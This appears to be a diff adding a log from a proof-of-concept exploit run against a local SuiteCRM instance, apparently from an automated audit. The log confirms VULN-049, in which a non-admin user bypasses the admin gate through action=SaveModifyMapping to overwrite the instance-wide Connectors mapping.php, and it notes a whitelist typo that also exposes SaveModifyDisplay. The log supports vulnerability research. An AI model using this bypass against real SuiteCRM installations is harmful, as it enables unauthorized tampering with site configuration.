@@ -1,0 +1,20 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-049/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-049/../.venv
+========================================================================
+VULN-049: Connectors admin-gate bypass: non-admin writes mapping.php
+target: http://localhost:33116
+========================================================================
+[SETUP] admin web login + create one fresh low-priv (non-admin) user U
+[INFO] U = mod_55f08ad4 (98c47aca-3cc5-4cdc-9879-41884c8ae081)
+[STEP] control: U POSTs to the admin-gated sibling action=ConnectorSettings
+[PROOF] control: ViewNoaccess denial text present (gate mechanism works for U): True
+[INFO] mapping.php before attack (may not exist yet): ''
+[STEP] attack: U (non-admin) POSTs action=SaveModifyMapping, marker='vuln049marker_70d1c808'
+[INFO] attack response status=200 len=83666
+[PROOF] reading /var/www/html/custom/modules/Connectors/connectors/sources/ext/rest/insideview/mapping.php from the app container after the non-admin request
+[PROOF] marker 'vuln049marker_70d1c808' present in instance-wide mapping.php: True
+[PROOF] decisive line: "array (\n  'beans' => \n  array (\n    'Accounts' => \n    array (\n      'name' => 'vuln049marker_70d1c808',\n      'id' => '"
+[STEP] bonus: U (non-admin) POSTs action=SaveModifyDisplay (whitelist has typo 'SavedModifyDisplay')
+[PROOF] SaveModifyDisplay as non-admin: status=200 denial page shown: False (expected False -- also reachable via the same typo gap)
+[OK] non-admin U rewrote the instance-wide Connectors mapping.php via action_SaveModifyMapping
+==> VULN-049: CONFIRMED — non-admin wrote marker vuln049marker_70d1c808 into custom/.../insideview/mapping.php via SaveModifyMapping
